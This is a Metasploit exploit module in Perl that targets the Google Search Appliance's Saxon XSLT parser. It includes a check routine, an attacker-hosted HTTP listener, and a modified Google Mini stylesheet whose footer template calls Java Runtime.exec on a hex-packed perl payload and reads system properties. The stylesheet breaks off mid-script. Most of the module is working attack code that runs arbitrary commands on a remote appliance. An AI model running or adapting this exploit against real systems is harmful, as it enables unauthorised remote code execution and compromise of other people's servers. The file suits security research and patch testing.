
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::google_proxystylesheet_exec;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket;
use IO::Select;
my $advanced = { };

my $info =
{
	'Name'           => 'Google Appliance ProxyStyleSheet Command Execution',
	'Version'        => '$Revision: 1.2 $',
	'Authors'        => [ 'H D Moore <hdm [at] metasploit.com>' ],
	
	'Description'    => 
		Pex::Text::Freeform(qq{
			This module exploits a feature in the Saxon XSLT parser used by
		the Google Search Appliance. This feature allows for arbitrary
		java methods to be called. Google released a patch and advisory to 
		their client base in August of 2005 (GA-2005-08-m). The target appliance
		must be able to connect back to your machine for this exploit to work.
		}),
		
	'Arch'           => [ ],
	'OS'             => [ ],
	'Priv'           => 0,
	'UserOpts'       => 
		{
			'RHOST'    => [ 1, 'HOST', 'The address of the Google appliance'],
			'RPORT'    => [ 1, 'PORT', 'The port used by the search interface', 80],
			'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
			'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
			'HTTPADDR' => [ 0, 'HOST', 'The address that can be used to connect back to this system'],
		},
	'Payload'        => 
		{
			'Space'    => 1024,
			'Keys'     => [ 'cmd' ],
		},
	'Refs'           => 
		[
			['OSVDB', 20981],
		],
	'DefaultTarget'  => 0,
	'Targets'        =>
		[
			[ 'Google Search Appliance']
		],
	'Keys'           => [ 'google' ],

	'DisclosureDate' => 'Aug 16 2005',
};

sub new
{
	my $class = shift;
	my $self;
	
	$self = $class->SUPER::new(
			{ 
				'Info'     => $info,
				'Advanced' => $advanced,
			},
			@_);

	return $self;
}

sub Check {
	my $self = shift;
	my $s = $self->ConnectSearch;
	
	if (! $s) {
		return $self->CheckCode('Connect');
	}
	
	my $url =
		"/search?client=". Pex::Text::AlphaNumText(int(rand(15))+1). "&".
		"site=".Pex::Text::AlphaNumText(int(rand(15))+1)."&".
		"output=xml_no_dtd&".
		"q=".Pex::Text::AlphaNumText(int(rand(15))+1)."&".
		"proxystylesheet=http://".Pex::Text::AlphaNumText(int(rand(32))+1)."/";
	
	$s->Send("GET $url HTTP/1.0\r\n\r\n");
	my $page = $s->Recv(-1, 5);
	$s->Close;

	if ($page =~ /cannot be resolved to an ip address/) {
		$self->PrintLine("[*] This system appears to be vulnerable >:-)");
		return $self->CheckCode('Confirmed');
	}
	
	if ($page =~ /ERROR: Unable to fetch the stylesheet/) {
		$self->PrintLine("[*] This system appears to be patched");
	}
	
	$self->PrintLine("[*] This system does not appear to be vulnerable");
	return $self->CheckCode('Safe');	
}


sub Exploit
{
	my $self = shift;
	my ($s, $page);
	
	# Request the index page to obtain a redirect response
	$s = $self->ConnectSearch || return;
	$s->Send("GET / HTTP/1.0\r\n\r\n");
	$page = $s->Recv(-1, 5);
	$s->Close;

	# Parse the redirect to get the client and site values
	my ($goog_site, $goog_clnt) = $page =~ m/^location.*site=([^\&]+)\&.*client=([^\&]+)\&/im;
	if (! $goog_site || ! $goog_clnt) {
		$self->PrintLine("[*] Invalid response to our request, is this a Google appliance?");
		return;
	}

	# Create the listening local socket that will act as our HTTP server
	my $lis = IO::Socket::INET->new(
			LocalHost => $self->GetVar('HTTPHOST'),
			LocalPort => $self->GetVar('HTTPPORT'),
			ReuseAddr => 1,
			Listen    => 1,
			Proto     => 'tcp');
	
	if (not defined($lis)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}
	my $sel = IO::Select->new($lis);
	
	# Send a search request with our own address in the proxystylesheet parameter
	my $query = Pex::Text::AlphaNumText(int(rand(32))+1);
	
	my $proxy =
		"http://".
		($self->GetVar('HTTPADDR') || Pex::Utils::SourceIP($self->GetVar('RHOST'))).
		":".$self->GetVar('HTTPPORT')."/".Pex::Text::AlphaNumText(int(rand(15))+1).".xsl";
	
	my $url = 
		"/search?client=". $goog_clnt ."&site=". $goog_site .
		"&output=xml_no_dtd&proxystylesheet=". $proxy .
		"&q=". $query ."&proxyreload=1";

	$self->PrintLine("[*] Sending our malicious search request...");
	$s = $self->ConnectSearch || return;
	$s->Send("GET $url HTTP/1.0\r\n\r\n");
	$page = $s->Recv(-1, 3);
	$s->Close;

	$self->PrintLine("[*] Listening for connections to http://" . $self->GetVar('HTTPHOST') . ":" . $self->GetVar('HTTPPORT') . " ...");
	
	# Did we receive a connection?
	my @r = $sel->can_read(30);
	
	if (! @r) {
		$self->PrintLine("[*] No connection received from the search engine, possibly patched.");
		$lis->close;
		return;
	}

	my $c = $lis->accept();
	if (! $c) {
		$self->PrintLine("[*] No connection received from the search engine, possibly patched.");
		$lis->close;
		return;	
	}

	my $cli = Msf::Socket::Tcp->new_from_socket($c);
	$self->PrintLine("[*] Connection received from ".$cli->PeerAddr."...");	
	$self->ProcessHTTP($cli);
	return;
}

sub ConnectSearch {
	my $self = shift;
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $self->GetVar('RHOST'),
		'PeerPort' => $self->GetVar('RPORT'),
		'SSL'      => $self->GetVar('SSL')
	);
	
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
	return $s;
}

sub ProcessHTTP
{
	my $self = shift;
	my $cli  = shift;
	my $targetIdx = $self->GetVar('TARGET');
	my $target    = $self->Targets->[$targetIdx];
	my $ret       = $target->[1];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $content;
	my $rhost;
	my $rport;

	# Read the first line of the HTTP request
	my ($cmd, $url, $proto) = split(/ /, $cli->RecvLine(10));

	# The way we call Runtime.getRuntime().exec, Java will split
	# our string on whitespace. Since we are injecting via XSLT,
	# inserting quotes becomes a huge pain, so we do this...
	my $exec_str = 
		'/usr/bin/perl -e system(pack(qq{H*},qq{' .
		unpack("H*", $self->GetVar('EncodedPayload')->RawPayload).
		'}))';

	# Load the template from our data section, we have to manually
	# seek and reposition to allow the exploit to be used more
	# than once without a reload.
	seek(DATA, 0, 0);
	while(<DATA>) { last if /^__DATA__$/ }
	while(<DATA>) {	$content .= $_ }

	# Insert our command line
	$content =~ s/:x:MSF:x:/$exec_str/;
	
	# Send it to the requesting appliance
	$rport = $cli->PeerPort;
	$rhost = $cli->PeerAddr;
	$self->PrintLine("[*] HTTP Client connected from $rhost, sending XSLT...");
	
	my $res = "HTTP/1.1 200 OK\r\n" .
	          "Content-Type: text/html\r\n" .
	          "Content-Length: " . length($content) . "\r\n" .
	          "Connection: close\r\n" .
	          "\r\n" .
	          $content;

	$self->PrintLine("[*] Sending ".length($res)." bytes...");
	$cli->Send($res);
	$cli->Close;
}

1;

# The default Google Mini style sheet is included below, with a few modifications to
# the my_page_footer template.
__DATA__
<!-- *** START OF STYLESHEET *** -->

<!-- **********************************************************************
 XSL to format the search output for Google Search Appliance 
     ********************************************************************** -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:output method="html"/>

<!-- **********************************************************************
 Logo setup (can be customized)
     - whether to show logo: 0 for FALSE, 1 (or non-zero) for TRUE
     - logo url 
     - logo size: '' for default image size
     ********************************************************************** -->
<xsl:variable name="show_logo">1</xsl:variable>
<xsl:variable name="logo_url">images/Title_Left.gif</xsl:variable>
<xsl:variable name="logo_width">200</xsl:variable>
<xsl:variable name="logo_height">78</xsl:variable>

<!-- **********************************************************************
 Global Style variables (can be customized): '' for using browser's default
     ********************************************************************** -->

<xsl:variable name="global_font">arial,sans-serif</xsl:variable>
<xsl:variable name="global_font_size"></xsl:variable>
<xsl:variable name="global_bg_color">#ffffff</xsl:variable> 
<xsl:variable name="global_text_color">#000000</xsl:variable> 
<xsl:variable name="global_link_color">#0000cc</xsl:variable> 
<xsl:variable name="global_vlink_color">#551a8b</xsl:variable> 
<xsl:variable name="global_alink_color">#ff0000</xsl:variable> 


<!-- **********************************************************************
 Result page components (can be customized)
     - whether to show a component: 0 for FALSE, non-zero (e.g., 1) for TRUE
     - text and style
     ********************************************************************** -->

<!-- *** choose result page header: '', 'provided', 'mine', or 'both' *** -->
<xsl:variable name="choose_result_page_header">both</xsl:variable>

<!-- *** customize provided result page header *** -->
<xsl:variable name="show_result_page_adv_link">1</xsl:variable>
<xsl:variable name="adv_search_anchor_text">Advanced Search</xsl:variable>
<xsl:variable name="show_result_page_help_link">1</xsl:variable>
<xsl:variable name="search_help_anchor_text">Search Tips</xsl:variable>

<!-- *** search boxes *** -->
<xsl:variable name="show_top_search_box">1</xsl:variable>
<xsl:variable name="show_bottom_search_box">1</xsl:variable>
<xsl:variable name="search_box_size">32</xsl:variable>

<!-- *** choose search button type: 'text' or 'image' *** -->
<xsl:variable name="choose_search_button">text</xsl:variable>
<xsl:variable name="search_button_text">Google Search</xsl:variable>
<xsl:variable name="search_button_image_url"></xsl:variable>
<xsl:variable name="search_subcollections_xslt"></xsl:variable>

<!-- *** search info bars *** -->
<xsl:variable name="show_search_info">1</xsl:variable>

<!-- *** choose separation bar: 'blue', 'line', 'nothing' *** -->
<xsl:variable name="choose_sep_bar">blue</xsl:variable>

<!-- *** navigation bars: '', 'google', 'link', or 'simple'*** -->
<xsl:variable name="show_top_navigation">0</xsl:variable>
<xsl:variable name="choose_bottom_navigation">google</xsl:variable>
<xsl:variable name="my_nav_align">right</xsl:variable>
<xsl:variable name="my_nav_size">-1</xsl:variable>
<xsl:variable name="my_nav_color">#6f6f6f</xsl:variable>

<!-- *** sort by date/relevance *** -->
<xsl:variable name="show_sort_by">0</xsl:variable>

<!-- *** spelling suggestions *** -->
<xsl:variable name="show_spelling">1</xsl:variable>
<xsl:variable name="spelling_text">Did you mean:</xsl:variable>
<xsl:variable name="spelling_text_color">#cc0000</xsl:variable>

<!-- *** synonyms suggestions *** -->
<xsl:variable name="show_synonyms">1</xsl:variable>
<xsl:variable name="synonyms_text">You could also try:</xsl:variable>
<xsl:variable name="synonyms_text_color">#cc0000</xsl:variable>

<!-- *** keymatch suggestions *** -->
<xsl:variable name="show_keymatch">1</xsl:variable>
<xsl:variable name="keymatch_text">KeyMatch</xsl:variable>
<xsl:variable name="keymatch_text_color">#2255aa</xsl:variable>
<xsl:variable name="keymatch_bg_color">#e8e8ff</xsl:variable>

<!-- **********************************************************************
 Result elements (can be customized)
     - whether to show an element ('1' for yes, '0' for no)
     - font/size/color ('' for using style of the context)
     ********************************************************************** -->

<!-- *** result title and snippet *** -->
<xsl:variable name="show_res_title">1</xsl:variable>
<xsl:variable name="res_title_color">#0000cc</xsl:variable>
<xsl:variable name="res_title_size"></xsl:variable>
<xsl:variable name="show_res_snippet">1</xsl:variable>
<xsl:variable name="res_snippet_size">80%</xsl:variable>

<!-- *** keyword match (in title or snippet) *** -->
<xsl:variable name="res_keyword_color"></xsl:variable>
<xsl:variable name="res_keyword_size"></xsl:variable>
<xsl:variable name="res_keyword_format">b</xsl:variable> <!-- 'b' for bold -->

<!-- *** link URL *** -->
<xsl:variable name="show_res_url">1</xsl:variable>
<xsl:variable name="res_url_color">#008000</xsl:variable>
<xsl:variable name="res_url_size">-1</xsl:variable>

<!-- *** misc elements *** -->
<xsl:variable name="show_res_description">1</xsl:variable>
<xsl:variable name="show_res_size">1</xsl:variable>
<xsl:variable name="show_res_date">1</xsl:variable>
<xsl:variable name="show_res_cache">1</xsl:variable>

<!-- *** used in result cache link, similar pages link, and description *** -->
<xsl:variable name="faint_color">#6f6f6f</xsl:variable> 

<!-- *** show secure results radio button *** -->
<xsl:variable name="show_secure_radio">0</xsl:variable>

<!-- **********************************************************************
 Other variables (can be customized)
     ********************************************************************** -->

<!-- *** page title *** -->
<xsl:variable name="front_page_title">Search Home</xsl:variable>
<xsl:variable name="result_page_title">Search Results</xsl:variable>
<xsl:variable name="adv_page_title">Advanced Search</xsl:variable>
<xsl:variable name="error_page_title">Error</xsl:variable>

<!-- *** choose adv_search page header: '', 'provided', 'mine', or 'both' *** -->
<xsl:variable name="choose_adv_search_page_header">both</xsl:variable>

<!-- *** cached page header text *** -->
<xsl:variable name="cached_page_header_text">This is the cached copy of </xsl:variable>

<!-- *** error message text *** -->
<xsl:variable name="xml_error_msg_text">Unknown XML result type.</xsl:variable>
<xsl:variable name="xml_error_des_text">View page source to see the offending XML.</xsl:variable>

<!-- *** advanced search page panel background color *** -->
<xsl:variable name="adv_search_panel_bgcolor">#cbdced</xsl:variable> 


<!-- **********************************************************************
 My global page header/footer (can be customized)
     ********************************************************************** -->
<xsl:template name="my_page_header">
  <!-- *** replace the following with your own xhtml code or replace the text 
   between the xsl:text tags with html escaped html code *** -->
  <xsl:text disable-output-escaping="yes"> <!-- Please enter html code below. --></xsl:text>
</xsl:template>

<xsl:template 
	name="my_page_footer"
	xmlns:sys="http://www.oracle.com/XSL/Transform/java/java.lang.System"
	xmlns:run="http://www.oracle.com/XSL/Transform/java/java.lang.Runtime"
>

<!-- Google XSLT Code Execution [metasploit] -->

XSLT Version: <xsl:value-of select="system-property('xsl:version')"/> <br />
XSLT Vendor: <xsl:value-of select="system-property('xsl:vendor')" /> <br />
XSLT URL: <xsl:value-of select="system-property('xsl:vendor-url')" /> <br />
OS: <xsl:value-of select="sys:getProperty('os.name')" /> <br />
Version: <xsl:value-of select="sys:getProperty('os.version')" /> <br />
Arch: <xsl:value-of select="sys:getProperty('os.arch')" /> <br />
UserName: <xsl:value-of select="sys:getProperty('user.name')" /> <br />
UserHome: <xsl:value-of select="sys:getProperty('user.home')" /> <br />
UserDir: <xsl:value-of select="sys:getProperty('user.dir')" /> <br />

Executing command...<br />
<xsl:value-of select="run:exec(run:getRuntime(), ':x:MSF:x:')" />

    <xsl:text disable-output-escaping="yes"> <!-- Please enter html code below. --></xsl:text>
  </span>
</xsl:template>


<!-- **********************************************************************
 Logo template (can be customized)
     ********************************************************************** -->
<xsl:template name="logo">
    <a href="{$home_url}"><img src="{$logo_url}" 
      width="{$logo_width}" height="{$logo_height}"
      alt="Go to Search Home" border="0" /></a>
</xsl:template>


<!-- **********************************************************************
 Search result page header (can be customized): logo and search box
     ********************************************************************** -->
<xsl:template name="result_page_header">
    <table border="0" cellpadding="0" cellspacing="0">
      <tr>
	<xsl:if test="$show_logo != '0'">
	  <td rowspan="3" valign="top">
            <xsl:call-template name="logo"/>
            <xsl:call-template name="nbsp3"/>
          </td>
	</xsl:if>
        <td nowrap="1">
          <font size="-1">
	    <xsl:if test="$show_result_page_adv_link != '0'">
              <a href="{$adv_search_url}">
                <xsl:value-of select="$adv_search_anchor_text"/>
              </a>
              <xsl:call-template name="nbsp4"/>
	    </xsl:if>
	    <xsl:if test="$show_result_page_help_link != '0'">
              <a href="{$help_url}">
                <xsl:value-of select="$search_help_anchor_text"/>
              </a>
	    </xsl:if>
            <br/>
          </font>
        </td>
      </tr>
      <xsl:if test="$show_top_search_box != '0'">
        <tr>
          <td valign="middle">
            <xsl:call-template name="search_box"/>
          </td>
        </tr>
      </xsl:if>
      <xsl:if test="/GSP/CT">
	<tr>
          <td valign="top">
            <br/>
            <xsl:call-template name="stopwords"/>
            <br/>
          </td>
        </tr>
      </xsl:if>
    </table>
</xsl:template>


<!-- **********************************************************************
 Separation bar variables (used in advanced search header and result page)
     ********************************************************************** -->
<xsl:variable name="sep_bar_bg_color">
  <xsl:choose>
    <xsl:when test="$choose_sep_bar = 'blue'">#3366cc</xsl:when>
    <xsl:otherwise><xsl:value-of select="$global_bg_color"/></xsl:otherwise>
  </xsl:choose>
</xsl:variable>

<xsl:variable name="sep_bar_text_color">
  <xsl:choose>
    <xsl:when test="$choose_sep_bar = 'blue'">#ffffff</xsl:when>
    <xsl:otherwise><xsl:value-of select="$global_text_color"/></xsl:otherwise>
  </xsl:choose>
</xsl:variable>


<!-- **********************************************************************
 Advanced search page header HTML (can be customized)
     ********************************************************************** -->
<xsl:template name="advanced_search_header">
      <table width="99%" border="0" cellpadding="0" cellspacing="2">
        <tr>          
  	  <xsl:if test="$show_logo != '0'">
          <td rowspan="2" width="1%">
            <table cellpadding="0" cellspacing="0" border="0">
              <tr>
                <td align="right" valign="bottom">
		<xsl:call-template name="logo"/></td>
              </tr>
            </table>
          </td>
  	  </xsl:if>

          <td valign="bottom" align="right"><font size="-1" class="p"></font></td>
        </tr>

        <tr>
          <td valign="middle">
            <table cellspacing="2" cellpadding="2" border="0" width="100%">
              <tr bgcolor="{$sep_bar_bg_color}">
                <td><font face="{$global_font}" color="{$sep_bar_text_color}">
                      <b><xsl:call-template name="nbsp"/>
                         <xsl:value-of select="$adv_page_title"/></b>
                    </font>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
</xsl:template>


<!-- **********************************************************************
 Cached page header (can be customized)
     ********************************************************************** -->
<xsl:template name="cached_page_header">
  <xsl:param name="cached_page_url"/>

<table border="1" width="100%">
  <tr>
    <td>
      <table border="1" width="100%" cellpadding="10" cellspacing="0" 
        bgcolor="{$global_bg_color}" color="{$global_bg_color}">
        <tr>
          <td>
            <font face="{$global_font}" color="{$global_text_color}" size="-1">
              <xsl:value-of select="$cached_page_header_text"/>
            <a href="{$cached_page_url}"><font color="{$global_link_color}">
              <xsl:value-of select="$cached_page_url"/></font></a>.<br/>
            </font>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>
<hr/>
</xsl:template>


<!-- **********************************************************************
 "Front door" search input page (can be customized)
     ********************************************************************** -->
<xsl:template name="front_door">
<html>
  <xsl:call-template name="langHeadStart"/>
    <title><xsl:value-of select="$front_page_title"/></title>
  <xsl:call-template name="style"/>
  <xsl:call-template name="langHeadEnd"/>

  <body>
  
  <xsl:call-template name="my_page_header"/>
  <xsl:call-template name="result_page_header"/>
  <hr/>
  <xsl:call-template name="copyright"/>
  <xsl:call-template name="my_page_footer"/>

  </body>
</html>
</xsl:template>


<!-- **********************************************************************
 Empty result set (can be customized)
     ********************************************************************** -->
<xsl:template name="no_RES">
  <xsl:param name="query"/>
  <span class="p">
  <br/>
  Your search - <b><xsl:value-of disable-output-escaping="yes" 
  select="$query"/></b> - did not match any documents.
  <br/>
  No pages were found containing <b>"<xsl:value-of 
  disable-output-escaping="yes" select="$query"/>"</b>.
  <br/>
  <br/>
  Suggestions:
  <ul>
    <li>Make sure all words are spelled correctly.</li>
    <li>Try different keywords.</li>
    <li>Try more general keywords.</li>
  </ul>
  </span>
</xsl:template>


<!-- ######################################################################
 We do not recommend changes to the following code.  Google Technical
 Support Personnel currently do not support customization of XSLT under
 these Technical Support Services Guidelines.  Such services may be
 provided on a consulting basis, at Google's then-current consulting
 services rates under a separate agreement, if Google personnel are
 available.  Please ask your Google Account Manager for more details if
 you are interested in purchasing consulting services.
     ###################################################################### -->


<!-- **********************************************************************
 Global Style (do not customize)
	default font type/size/color, background color, link color
 	using HTML CSS (Cascading Style Sheets)
     ********************************************************************** -->
<xsl:template name="style">
<style>
<xsl:comment>
body,.d,.p,.s{background-color:<xsl:value-of select="$global_bg_color"/>}
body,td,div,.p,a,.d,.s{font-family:<xsl:value-of select="$global_font"/>}
body,td,div,.p,a,.d{font-size: <xsl:value-of select="$global_font_size"/>}
body,div,td,.p,.s{color:<xsl:value-of select="$global_text_color"/>}
.s,.f,.f a{font-size: <xsl:value-of select="$res_snippet_size"/>}
.l{font-size: <xsl:value-of select="$res_title_size"/>}
.l{color: <xsl:value-of select="$res_title_color"/>}
a:link,.w,.w a:link{color:<xsl:value-of select="$global_link_color"/>}
a:visited,.f a:visited{color:<xsl:value-of select="$global_vlink_color"/>}
a:active,.f a:active{color:<xsl:value-of select="$global_alink_color"/>}
.t{color:<xsl:value-of select="$sep_bar_text_color"/>}
.t{background-color:<xsl:value-of select="$sep_bar_bg_color"/>}
.z{display:none}
.f,.f:link,.f a:link{color:<xsl:value-of select="$faint_color"/>}
.i,.i:link{color:#a90a08}
.a,.a:link{color:<xsl:value-of select="$res_url_color"/>}
div.n {margin-top: 1ex}
.n a{font-size: 10pt; color:<xsl:value-of select="$global_text_color"/>}
.n .i{font-size: 10pt; font-weight:bold}
.q a:visited,.q a:link,.q a:active,.q {text-decoration: none; color:#0000cc;}
.b,.b a{font-size: 12pt; color:#0000cc; font-weight:bold}
.d{font-family:<xsl:value-of select="$global_font"/>; 
   margin-right:1em; margin-left:1em;}
</xsl:comment>
</style>
</xsl:template>


<!-- **********************************************************************
 URL variables (do not customize)
     ********************************************************************** -->

<!-- *** help_url: search tip URL (html file) *** -->
<xsl:variable name="help_url">/basics.html</xsl:variable>

<!-- *** base_url: collection info *** -->
<xsl:variable name="base_url"><xsl:for-each 
  select="/GSP/PARAM[@name = 'client' or
                     @name = 'site' or 
                     @name = 'num' or
                     @name = 'output' or
                     @name = 'proxystylesheet' or
                     @name = 'sitesearch' or
                     @name = 'access' or
	             (@name = 'restrict' and 
		      $search_subcollections_xslt = '') or
                     @name = 'lr' or
                     @name = 'ie' or
                     @name = 'oe']"><xsl:value-of select="@name"
  />=<xsl:value-of select="@original_value"
  /><xsl:if test="position() != last()">&amp;</xsl:if></xsl:for-each>
</xsl:variable>

<!-- *** home_url: /search? + collection info + &proxycustom=<HOME/> *** -->
<xsl:variable name="home_url">/search?<xsl:value-of select="$base_url"
  />&amp;proxycustom=&lt;HOME/&gt;</xsl:variable>

<!-- *** nav_url: does not include q, as_, start elements *** -->
<xsl:variable name="nav_url"><xsl:for-each 
  select="/GSP/PARAM[(@name != 'q') and
		     not(contains(@name, 'as_')) and
                     (@name != 'start')]">
    <xsl:value-of select="@name"/><xsl:text>=</xsl:text>
    <xsl:value-of select="@original_value"/>
    <xsl:if test="position() != last()">
      <xsl:text disable-output-escaping="yes">&amp;</xsl:text>
    </xsl:if>
  </xsl:for-each>
</xsl:variable>

<!-- *** synonym_url: does not include q, as_q, and start elements *** -->
<xsl:variable name="synonym_url"><xsl:for-each 
  select="/GSP/PARAM[(@name != 'q') and
		     (@name != 'as_q') and
                     (@name != 'start')]">
    <xsl:value-of select="@name"/><xsl:text>=</xsl:text>
    <xsl:value-of select="@original_value"/>
    <xsl:if test="position() != last()">
      <xsl:text disable-output-escaping="yes">&amp;</xsl:text>
    </xsl:if>
  </xsl:for-each>
</xsl:variable>

<!-- *** search_url: $nav_url + query elements *** -->
<xsl:variable name="search_url"><xsl:for-each
  select="/GSP/PARAM[(@name != 'start')]">
    <xsl:value-of select="@name"/><xsl:text>=</xsl:text>
    <xsl:value-of select="@original_value"/>
    <xsl:if test="position() != last()">
      <xsl:text disable-output-escaping="yes">&amp;</xsl:text>
    </xsl:if>
  </xsl:for-each>
</xsl:variable>

<!-- *** filter_url: everything except resetting "filter=" *** -->
<xsl:variable name="filter_url">/search?<xsl:for-each 
  select="/GSP/PARAM[(@name != 'filter')]">
    <xsl:value-of select="@name"/><xsl:text>=</xsl:text>
    <xsl:value-of select="@original_value"/>
    <xsl:text disable-output-escaping="yes">&amp;</xsl:text>
  </xsl:for-each><xsl:text>filter=</xsl:text>
</xsl:variable>

<!-- *** adv_search_url: /search? + $search_url + as_q=$q *** -->
<xsl:variable name="adv_search_url">/search?<xsl:value-of 
  select="$search_url"/>&amp;proxycustom=&lt;ADVANCED/&gt;</xsl:variable>

<!-- **********************************************************************
 Search Parameters (do not customize)
     ********************************************************************** -->

<!-- *** num_results: actual num_results per page *** -->
<xsl:variable name="num_results">
  <xsl:choose>
    <xsl:when test="/GSP/PARAM[(@name='num') and (@value!='')]">
      <xsl:value-of select="/GSP/PARAM[@name='num']/@value"/>
    </xsl:when>
    <xsl:otherwise>
      <xsl:value-of select="10"/>
    </xsl:otherwise>
  </xsl:choose>
</xsl:variable>

<!-- *** form_params: parameters carried by the search input form *** -->
<xsl:template name="form_params">
  <xsl:for-each 
    select="PARAM[@name != 'q' and 
                  not(contains(@name, 'as_')) and 
                  @name != 'btnG' and 
                  @name != 'btnI' and
                  @name != 'filter' and
                  @name != 'start' and
		  @name != 'access' and
                  @name != 'ip']">
    <xsl:if test="@name != 'restrict' or $search_subcollections_xslt = ''">
      <input type="hidden" name="{@name}" value="{@value}" />
    </xsl:if>
    <xsl:text>
    </xsl:text>
  </xsl:for-each>
</xsl:template>

<!-- *** html_escaped_query: q = /GSP/Q *** -->
<xsl:variable name="qval">
  <xsl:value-of select="/GSP/Q"/>
</xsl:variable>

<xsl:variable name="html_escaped_query">
  <xsl:value-of select="normalize-space($qval)" 
    disable-output-escaping="yes"/>  
</xsl:variable>

<!-- *** stripped_search_query: q, as_q, ... for cache highlight *** -->
<xsl:variable name="stripped_search_query"><xsl:for-each 
  select="/GSP/PARAM[(@name = 'q') or
                     (@name = 'as_q') or
                     (@name = 'as_oq') or
                     (@name = 'as_epq')]"><xsl:value-of select="@original_value"
  /><xsl:if test="position() != last()"
    ><xsl:text disable-output-escaping="yes">+</xsl:text
     ></xsl:if></xsl:for-each>
</xsl:variable>

<xsl:variable name="access">
  <xsl:choose>
    <xsl:when test="/GSP/PARAM[(@name='access') and ((@value='s') or (@value='a'))]">
      <xsl:value-of select="/GSP/PARAM[@name='access']/@original_value"/>
    </xsl:when>
    <xsl:otherwise>p</xsl:otherwise>
  </xsl:choose>
</xsl:variable>

<!-- **********************************************************************
 Figure out what kind of page this is (do not customize)
     ********************************************************************** -->
<xsl:template match="GSP">
  <xsl:choose>
    <xsl:when test="Q">
      <xsl:call-template name="search_results"/>
    </xsl:when>
    <xsl:when test="CACHE">
      <xsl:call-template name="cached_page"/>
    </xsl:when>
    <xsl:when test="CUSTOM/HOME">
      <xsl:call-template name="front_door"/>
    </xsl:when>
    <xsl:when test="CUSTOM/ADVANCED">
      <xsl:call-template name="advanced_search"/>
    </xsl:when>
    <xsl:when test="H1">
      <xsl:call-template name="server_error"/>
    </xsl:when>
    <xsl:otherwise>
      <xsl:call-template name="error_page">
        <xsl:with-param name="errorMessage" select="$xml_error_msg_text"/>
        <xsl:with-param name="errorDescription" select="$xml_error_des_text"/>
      </xsl:call-template>
    </xsl:otherwise>
  </xsl:choose>
</xsl:template>

<!-- **********************************************************************
 Cached page (do not customize)
     ********************************************************************** -->
<xsl:template name="cached_page">
<xsl:variable name="cached_page_url" select="CACHE/CACHE_URL"/>
<xsl:variable name="cached_page_html" select="CACHE/CACHE_HTML"/>

<!-- *** decide whether to load html page or pdf file *** -->
<xsl:if test="'.pdf' != substring($cached_page_url, 
  1 + string-length($cached_page_url) - string-length('.pdf'))">
    <base href="{$cached_page_url}"/>
</xsl:if>

<!-- *** display cache page header *** -->
<xsl:call-template name="cached_page_header">
  <xsl:with-param name="cached_page_url" select="$cached_page_url"/>
</xsl:call-template>

<!-- *** display cached contents *** -->
<xsl:value-of select="$cached_page_html" disable-output-escaping="yes"/>
</xsl:template>

<xsl:template name="escape_quot">
  <xsl:param name="string"/>
  <xsl:call-template name="replace_string">
    <xsl:with-param name="find" select="'&quot;'"/>
    <xsl:with-param name="replace" select="'&amp;quot;'"/>
    <xsl:with-param name="string" select="$string"/>
  </xsl:call-template>
</xsl:template>

<!-- **********************************************************************
 Advanced search page (do not customize)
     ********************************************************************** -->
<xsl:template name="advanced_search">

<xsl:variable name="html_escaped_as_q">
    <xsl:call-template name="escape_quot">
      <xsl:with-param name="string" select="/GSP/PARAM[@name='q']/@value"/>
    </xsl:call-template>
    <xsl:call-template name="escape_quot">
      <xsl:with-param name="string" select="/GSP/PARAM[@name='as_q']/@value"/>
    </xsl:call-template>
</xsl:variable>

<xsl:variable name="html_escaped_as_epq">
    <xsl:call-template name="escape_quot">
      <xsl:with-param name="string" select="/GSP/PARAM[@name='as_epq']/@value"/>
    </xsl:call-template>
</xsl:variable>

<xsl:variable name="html_escaped_as_oq">
    <xsl:call-template name="escape_quot">
      <xsl:with-param name="string" select="/GSP/PARAM[@name='as_oq']/@value"/>
    </xsl:call-template>
</xsl:variable>

<xsl:variable name="html_escaped_as_eq">
    <xsl:call-template name="escape_quot">
      <xsl:with-param name="string" select="/GSP/PARAM[@name='as_eq']/@value"/>
    </xsl:call-template>
</xsl:variable>

<html>
<xsl:call-template name="langHeadStart"/>
<title><xsl:value-of select="$adv_page_title"/></title>
<xsl:call-template name="style"/>

<!-- script type="text/javascript" -->
<script>
<xsl:comment>
function setFocus() { 
document.f.as_q.focus(); }
function esc(x){
x = escape(x).replace(/\+/g, "%2b"); 
if (x.substring(0,2)=="\%u") x="";
return x;
}
function collecturl(target, custom) {
var p = new Array();var i = 0;var url="";var z = document.f;
if (z.as_q.value.length) {p[i++] = 'as_q=' + esc(z.as_q.value);}
if (z.as_epq.value.length) {p[i++] = 'as_epq=' + esc(z.as_epq.value);}
if (z.as_oq.value.length) {p[i++] = 'as_oq=' + esc(z.as_oq.value);}
if (z.as_eq.value.length) {p[i++] = 'as_eq=' + esc(z.as_eq.value);}
if (z.as_sitesearch.value.length)
  {p[i++]='as_sitesearch='+esc(z.as_sitesearch.value);}
if (z.as_lq.value.length) {p[i++] = 'as_lq=' + esc(z.as_lq.value);}
if (z.as_occt.options[z.as_occt.selectedIndex].value.length)
  {p[i++]='as_occt='+esc(z.as_occt.options[z.as_occt.selectedIndex].value);}
if (z.as_dt.options[z.as_dt.selectedIndex].value.length)
  {p[i++]='as_dt='+esc(z.as_dt.options[z.as_dt.selectedIndex].value);}
if (z.lr.options[z.lr.selectedIndex].value != '') {p[i++] = 'lr=' + 
  z.lr.options[z.lr.selectedIndex].value;}
if (z.num.options[z.num.selectedIndex].value != '10') 
  {p[i++] = 'num=' + z.num.options[z.num.selectedIndex].value;}
if (z.sort.options[z.sort.selectedIndex].value != '') 
  {p[i++] = 'sort=' + z.sort.options[z.sort.selectedIndex].value;}
if (typeof(z.client) != 'undefined') 
